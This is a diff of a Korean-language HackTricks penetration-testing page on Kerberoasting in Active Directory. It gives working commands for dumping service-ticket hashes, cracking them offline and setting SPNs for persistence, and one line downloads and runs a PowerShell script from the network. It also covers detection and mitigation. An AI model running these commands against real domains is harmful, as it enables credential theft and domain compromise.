@@ -3,43 +3,44 @@
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast)를 사용하여 세계에서 가장 **고급** 커뮤니티 도구로 구동되는 **워크플로우를 쉽게 구축** 및 **자동화**하세요.\
-오늘 바로 액세스하세요:
+[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast)를 사용하여 세계에서 **가장 진보된** 커뮤니티 도구로 구동되는 **워크플로우**를 쉽게 구축하고 **자동화**하세요.\
+지금 액세스하세요:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
 
+{% hint style="success" %}
+AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로부터 영웅까지의 AWS 해킹**을 배우세요!</summary>
+<summary>HackTricks 지원하기</summary>
 
-HackTricks를 지원하는 다른 방법:
-
-* **회사를 HackTricks에서 광고**하거나 **PDF로 HackTricks 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 얻으세요
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
-* **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
-* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.
+* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
+* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입하거나** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
+* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.
 
 </details>
+{% endhint %}
 
 ## Kerberoast
 
-Kerberoasting은 **Active Directory (AD)**에서 **컴퓨터 계정을 제외한 사용자 계정**으로 운영되는 서비스와 관련된 **TGS 티켓**의 획득에 중점을 둡니다. 이러한 티켓의 암호화는 **사용자 암호**에서 유래한 키를 사용하며, **오프라인 자격 증명 크래킹**의 가능성을 제공합니다. 서비스로 사용되는 사용자 계정은 비어 있지 않은 **"ServicePrincipalName"** 속성으로 표시됩니다.
+Kerberoasting은 **Active Directory (AD)**에서 **사용자 계정**으로 운영되는 서비스와 관련된 **TGS 티켓**의 획득에 중점을 둡니다. 이 티켓의 암호화는 **사용자 비밀번호**에서 유래한 키를 사용하여 이루어지며, 이는 **오프라인 자격 증명 크래킹**의 가능성을 허용합니다. 서비스로서 사용자 계정을 사용하는 것은 비어 있지 않은 **"ServicePrincipalName"** 속성으로 표시됩니다.
 
-**Kerberoasting**을 실행하기 위해서는 **TGS 티켓을 요청할 수 있는 도메인 계정**이 필수적이지만, 이 과정은 **특별한 권한**을 요구하지 않으므로 **유효한 도메인 자격 증명**을 가진 누구에게나 접근 가능합니다.
+**Kerberoasting**을 실행하기 위해서는 **TGS 티켓**을 요청할 수 있는 도메인 계정이 필수적이지만, 이 과정은 **특별한 권한**을 요구하지 않으므로 **유효한 도메인 자격 증명**을 가진 누구나 접근할 수 있습니다.
 
-### 주요 포인트:
+### 주요 사항:
 
-* **Kerberoasting**은 **AD** 내 **사용자 계정 서비스**를 대상으로 합니다.
-* **사용자 암호**에서 유래한 키로 암호화된 티켓은 **오프라인에서 크래킹**될 수 있습니다.
-* **ServicePrincipalName**이 비어 있지 않은 서비스를 식별합니다.
-* **특별한 권한**이 필요하지 않으며, **유효한 도메인 자격 증명**만 있으면 됩니다.
+* **Kerberoasting**은 **AD** 내의 **사용자 계정 서비스**에 대한 **TGS 티켓**을 목표로 합니다.
+* **사용자 비밀번호**에서 유래한 키로 암호화된 티켓은 **오프라인에서 크랙**될 수 있습니다.
+* 서비스는 null이 아닌 **ServicePrincipalName**으로 식별됩니다.
+* **특별한 권한**이 필요하지 않으며, 단지 **유효한 도메인 자격 증명**만 필요합니다.
 
 ### **공격**
 
 {% hint style="warning" %}
-**Kerberoasting 도구**는 공격을 수행하고 **TGS-REQ 요청을 시작할 때** 일반적으로 **`RC4 암호화`**를 요청합니다. 이는 **RC4**가 다른 암호화 알고리즘인 AES-128 및 AES-256보다 **약하며** Hashcat와 같은 도구를 사용하여 **오프라인에서 쉽게 크래킹**할 수 있기 때문입니다.\
-RC4 (유형 23) 해시는 **`$krb5tgs$23$*`**로 시작하며, AES-256(유형 18)은 **`$krb5tgs$18$*`**로 시작합니다.
+**Kerberoasting 도구**는 공격을 수행하고 TGS-REQ 요청을 시작할 때 일반적으로 **`RC4 암호화`**를 요청합니다. 이는 **RC4가** [**더 약하고**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) Hashcat과 같은 도구를 사용하여 오프라인에서 크랙하기 더 쉽기 때문입니다.\
+RC4 (유형 23) 해시는 **`$krb5tgs$23$*`**로 시작하며, AES-256(유형 18)은 **`$krb5tgs$18$*`**로 시작합니다.`
 {% endhint %}
 
 #### **Linux**
@@ -53,7 +54,7 @@ GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERN
 kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
 kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
 ```
-다음은 kerberoastable 사용자 덤프를 포함한 다중 기능 도구입니다:
+다양한 기능을 갖춘 도구로 kerberoastable 사용자 덤프 포함:
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
@@ -67,7 +68,7 @@ setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
 Get-NetUser -SPN | select serviceprincipalname #Powerview
 .\Rubeus.exe kerberoast /stats
 ```
-* **기법 1: TGS를 요청하고 메모리에서 덤프합니다**
+* **기법 1: TGS 요청 및 메모리에서 덤프하기**
 ```powershell
 #Get TGS in memory from a single user
 Add-Type -AssemblyName System.IdentityModel
@@ -104,68 +105,68 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
 {% hint style="warning" %}
-TGS를 요청할 때 Windows 이벤트 `4769 - Kerberos 서비스 티켓이 요청되었습니다`가 생성됩니다.
+TGS가 요청될 때, Windows 이벤트 `4769 - Kerberos 서비스 티켓이 요청되었습니다`가 생성됩니다.
 {% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast)를 사용하여 세계에서 가장 **고급** 커뮤니티 도구로 구동되는 **워크플로우를 쉽게 구축** 및 **자동화**하세요.\
+[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast)를 사용하여 세계에서 **가장 진보된** 커뮤니티 도구로 **워크플로우**를 쉽게 구축하고 **자동화**하세요.\
 오늘 바로 액세스하세요:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
 
-### Cracking
+### 크래킹
 ```bash
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### 지속성
+### Persistence
 
-만약 사용자에게 **충분한 권한**이 있다면, **kerberoastable**하게 만들 수 있습니다:
+사용자에 대해 **충분한 권한**이 있다면 **kerberoastable**하게 만들 수 있습니다:
 ```bash
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
 ```
-다음은 **kerberoast** 공격에 유용한 **도구**를 찾을 수 있습니다: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
+You can find useful **tools** for **kerberoast** attacks here: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
-만약 Linux에서 다음 **오류**를 발견한다면: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** 이는 로컬 시간 때문입니다. 호스트를 DC와 동기화해야 합니다. 몇 가지 옵션이 있습니다:
+If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** 이는 로컬 시간 때문이며, 호스트를 DC와 동기화해야 합니다. 몇 가지 옵션이 있습니다:
 
-* `ntpdate <DC의 IP>` - Ubuntu 16.04부터 사용이 중단됨
-* `rdate -n <DC의 IP>`
+* `ntpdate <IP of DC>` - Ubuntu 16.04부터 사용 중단
+* `rdate -n <IP of DC>`
 
-### 완화
+### Mitigation
 
-Kerberoasting은 취약점이 있는 경우 높은 은밀성으로 수행될 수 있습니다. 이 활동을 감지하기 위해 **보안 이벤트 ID 4769**에 주의를 기울여야 합니다. 그러나 이 이벤트의 빈도가 높기 때문에 의심스러운 활동을 분리하기 위해 특정 필터를 적용해야 합니다:
+Kerberoasting은 exploitable할 경우 높은 수준의 은밀함으로 수행될 수 있습니다. 이 활동을 감지하기 위해서는 **Security Event ID 4769**에 주의를 기울여야 하며, 이는 Kerberos 티켓이 요청되었음을 나타냅니다. 그러나 이 이벤트의 빈도가 높기 때문에 의심스러운 활동을 분리하기 위해 특정 필터를 적용해야 합니다:
 
-* 서비스 이름이 **krbtgt**이 아니어야 합니다. 이는 정상 요청입니다.
-* **$**로 끝나는 서비스 이름은 제외되어야 합니다. 서비스에 사용되는 기계 계정을 포함하지 않기 위함입니다.
-* 기계에서의 요청은 **machine@domain** 형식의 계정 이름을 제외함으로써 필터링되어야 합니다.
-* 실패 코드가 **'0x0'**인 성공적인 티켓 요청만 고려되어야 합니다.
-* **가장 중요한 것은**, 티켓 암호화 유형이 **0x17**이어야 합니다. 이는 Kerberoasting 공격에서 자주 사용됩니다.
+* 서비스 이름은 **krbtgt**가 아니어야 하며, 이는 정상 요청입니다.
+* **$**로 끝나는 서비스 이름은 서비스에 사용되는 머신 계정을 포함하지 않도록 제외해야 합니다.
+* 머신에서 오는 요청은 **machine@domain** 형식의 계정 이름을 제외하여 필터링해야 합니다.
+* 성공적인 티켓 요청만 고려해야 하며, 실패 코드 **'0x0'**로 식별됩니다.
+* **가장 중요하게**, 티켓 암호화 유형은 Kerberoasting 공격에 자주 사용되는 **0x17**이어야 합니다.
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
 ```
-Kerberoasting의 위험을 줄이기 위해:
+Kerberoasting의 위험을 완화하기 위해:
 
-* **서비스 계정 암호가 추측하기 어렵도록** 보장하고, **25자 이상**의 길이를 권장합니다.
-* **관리형 서비스 계정**을 활용하면 **자동 암호 변경** 및 **위임된 서비스 주체 이름 (SPN) 관리**와 같은 혜택을 제공하여 이러한 공격에 대한 보안을 강화할 수 있습니다.
+* **서비스 계정 비밀번호가 추측하기 어렵도록** 하며, **25자 이상**의 길이를 권장합니다.
+* **관리형 서비스 계정**을 활용하여 **자동 비밀번호 변경** 및 **위임된 서비스 주체 이름(SPN) 관리**와 같은 이점을 제공하여 이러한 공격에 대한 보안을 강화합니다.
 
-이러한 조치를 시행함으로써 조직은 Kerberoasting과 관련된 위험을 크게 줄일 수 있습니다.
+이러한 조치를 구현함으로써 조직은 Kerberoasting과 관련된 위험을 상당히 줄일 수 있습니다.
 
 ## 도메인 계정 없이 Kerberoast
 
-**2022년 9월**, 연구원인 Charlie Clark라는 사람이 새로운 시스템을 악용하는 방법을 [exploit.ph](https://exploit.ph/) 플랫폼을 통해 공개했습니다. 이 방법은 **서비스 티켓 (ST)**을 **KRB\_AS\_REQ** 요청을 통해 획득할 수 있게 해주는데, 이는 어떤 Active Directory 계정을 제어할 필요가 없다는 점이 놀라운 특징입니다. 본질적으로, 주체가 사전 인증을 필요로 하지 않도록 설정된 경우에 가능한 것으로, 사이버 보안 분야에서 알려진 **AS-REP Roasting 공격**과 유사한 시나리오입니다. 이 특성을 활용하여 요청 프로세스를 조작할 수 있습니다. 구체적으로, 요청 본문 내의 **sname** 속성을 변경함으로써 시스템을 속여 **ST** 대신 표준 암호화된 티켓 부여 티켓 (TGT)을 발급하도록 유도합니다.
+**2022년 9월**, Charlie Clark라는 연구자가 자신의 플랫폼 [exploit.ph](https://exploit.ph/)를 통해 시스템을 악용하는 새로운 방법을 공개했습니다. 이 방법은 **KRB_AS_REQ** 요청을 통해 **서비스 티켓(ST)**를 획득할 수 있게 해주며, 놀랍게도 어떤 Active Directory 계정에 대한 제어도 필요하지 않습니다. 본질적으로, 주체가 사전 인증을 요구하지 않도록 설정된 경우—사이버 보안 영역에서 **AS-REP Roasting 공격**으로 알려진 시나리오와 유사한 경우—이 특성을 활용하여 요청 프로세스를 조작할 수 있습니다. 구체적으로, 요청 본문 내의 **sname** 속성을 변경함으로써 시스템이 표준 암호화된 티켓 부여 티켓(TGT) 대신 **ST**를 발급하도록 속일 수 있습니다.
 
-이 기술에 대한 자세한 내용은 다음 기사에서 확인할 수 있습니다: [Semperis 블로그 게시물](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
+이 기술은 이 기사에서 완전히 설명되어 있습니다: [Semperis 블로그 게시물](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
 
 {% hint style="warning" %}
-이 기술을 사용하기 위해 LDAP을 쿼리할 유효한 계정이 없으므로 사용자 목록을 제공해야 합니다.
+이 기술을 사용하여 LDAP를 쿼리할 유효한 계정이 없기 때문에 사용자 목록을 제공해야 합니다.
 {% endhint %}
 
 #### Linux
 
-* [impacket/GetUserSPNs.py PR #1413](https://github.com/fortra/impacket/pull/1413):
+* [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
 ```bash
 GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
 ```
@@ -175,30 +176,31 @@ GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "d
 ```bash
 Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
 ```
-## 참고 자료
+## References
 
 * [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
 
+{% hint style="success" %}
+AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>제로부터 영웅이 될 때까지 AWS 해킹 배우기</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>HackTricks 지원하기</summary>
 
-HackTricks를 지원하는 다른 방법:
-
-* **회사가 HackTricks에 광고되길 원하거나 PDF로 HackTricks를 다운로드하고 싶다면** [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
-* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
-* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)이나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나** 트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
-* **해킹 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 저장소에 PR을 제출하세요.
+* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
+* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**
 
 </details>
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast)를 사용하여 세계에서 가장 **고급** 커뮤니티 도구로 구동되는 **워크플로우를 쉽게 구축**하고 **자동화**하세요.\
-오늘 바로 액세스하세요:
+[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast)를 사용하여 세계에서 **가장 진보된** 커뮤니티 도구로 구동되는 **워크플로우**를 쉽게 구축하고 **자동화**하세요.\
+오늘 바로 접근하세요:
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
